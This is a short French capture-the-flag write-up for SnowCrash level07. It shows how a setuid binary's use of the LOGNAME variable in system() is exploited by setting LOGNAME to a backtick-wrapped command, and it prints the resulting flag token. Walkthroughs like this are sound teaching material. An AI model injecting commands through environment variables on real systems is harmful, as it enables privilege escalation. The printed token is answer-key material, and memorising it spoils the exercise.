Pour ce niveau nous avons un executable

```bash
level07@SnowCrash:~$ ls -la
total 24
...
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
...
```

Nous essayons de l'executer

```bash
level07@SnowCrash:~$ ./level07
level07
```

Pour essayer de comprendre ce qu'il se passe, nous utilons les commandes `strings` et `strace` sur cet executable.

Nous ne trouvons pas grand chose, a part les appels a getenv avec la commande `strings`.

Nous essayons la commande ltrace et la on trouve quelque chose d'interessant:

```bash
level07@SnowCrash:~$ ltrace ./level07
...
getenv("LOGNAME") = "level07"
...
system("/bin/echo level07 "level07
...
```

Nous comprenous que l'execute recupere la variable d'environement `LOGNAME` puis l'affiche avec `echo`.

Nous allons donc verifier notre environement pour voir si nous trouvons bien la variable `LOGNAME` qui doit avoir la valeur `level07`.

```bash
level07@SnowCrash:~$ env
...
LOGNAME=level07
...
```

Nous modifions cette variable:

```bash
level07@SnowCrash:~$ export LOGNAME=\`getflag\`
```

Nous pouvons maintenant essayer d'executer level07

```bash
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

Nous avons notre flag !

```bash
su level08
```